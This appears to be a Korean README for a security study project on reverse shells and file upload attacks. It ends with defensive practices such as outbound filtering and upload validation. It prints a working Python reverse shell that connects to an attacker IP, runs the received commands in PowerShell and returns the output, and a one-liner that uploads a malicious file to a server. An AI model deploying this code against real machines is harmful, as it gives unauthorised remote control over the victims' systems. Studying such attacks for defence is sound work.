# 보안 취약점 분석과 대응: 리버스 쉘(Reverse Shell) 및 파일 업로드 공격

본 프로젝트는 시스템의 보안 취약점을 공격자의 관점에서 분석하고, 이를 통해 더욱 견고한 방어 체계를 구축하기 위한 **보안 및 해킹 기초** 학습 공간입니다. 네트워크 소켓 통신과 운영체제 제어 로직을 중심으로 실습을 진행하였습니다.

---

## 🛡️ 1. 리버스 쉘 (Reverse Shell) 분석

리버스 쉘은 타겟(Target) PC가 공격자의 서버로 먼저 연결을 시도하게 하여, 방화벽(Inbound Filter)을 우회하고 원격 제어 권한을 획득하는 수법입니다.

### Python 기반 리버스 쉘 로직 (`nc.py`)
타겟 PC에서 실행되며, 서버로부터 받은 명령을 **PowerShell**로 실행한 뒤 결과를 다시 서버로 전송합니다.

```python
# hacking/backdoor/nc.py
import socket
import subprocess

# 공격자 서버 정보
ip, port = "192.168.x.x", 4444

while True:
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((ip, port))
        while True:
            data = client_socket.recv(4096) # 명령 수신
            # PowerShell을 사용하여 수신된 명령 실행
            proc = subprocess.Popen(
                ["powershell.exe", data.decode("utf-8").strip()],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            stdout, stderr = proc.communicate()
            client_socket.sendall((stdout + stderr).encode()) # 결과 전송
    except:
        time.sleep(3) # 연결 실패 시 재시도
```

---

## 📂 2. 파일 업로드 및 다운로드 취약점

웹 서버의 파일 업로드 기능을 악용하여 악성 스크립트(Web Shell)나 실행 파일(`.exe`)을 서버에 올리고 실행하는 과정입니다.

### 공격 프로세스
1. **취약한 업로드 페이지 탐색:** 파일 확장자나 내용을 검증하지 않는 업로드 폼 확인.
2. **악성 파일 업로드:** `Invoke-WebRequest` 등을 사용하여 서버에 파일 전송.
    ```powershell
    (New-Object System.Net.WebClient).UploadFile('http://server/upload.php', 'malicious.py')
    ```
3. **원격 명령 실행:** 업로드된 파일을 브라우저나 시스템 명령으로 실행하여 제어권 획득.

---

## 🛠 주요 도구 및 라이브러리
- **Netcat (nc):** 네트워크 연결을 읽거나 쓰는 '네트워크의 맥가이버 칼'.
- **Socket / Subprocess:** 시스템 제어를 위한 파이썬 표준 라이브러리.
- **Apache2 / PHP:** 취약한 웹 환경 구성을 위한 인프라.
- **PowerShell:** 윈도우 환경에서의 명령 실행 및 시스템 조작.

---

## 🛡️ 시스템 방어 전략 (Security Best Practices)
- **최소 권한 원칙:** 서비스 프로세스는 반드시 제한된 권한의 계정으로 실행해야 합니다.
- **입력값 검증:** 업로드되는 파일의 확장자, MIME 타입, 파일 시그니처를 철저히 검증해야 합니다.
- **화이트리스트 기반 방화벽:** 불필요한 아웃바운드 포트(Outbound)를 차단하여 리버스 쉘 연결을 방지해야 합니다.
- **시스템 모니터링:** 평소와 다른 비정상적인 프로세스 실행이나 네트워크 연결을 실시간으로 감지해야 합니다.

---
*본 프로젝트는 보안 전문가로서의 윤리 의식을 바탕으로, 시스템 방어 능력을 강화하기 위한 목적으로 진행되었습니다.*
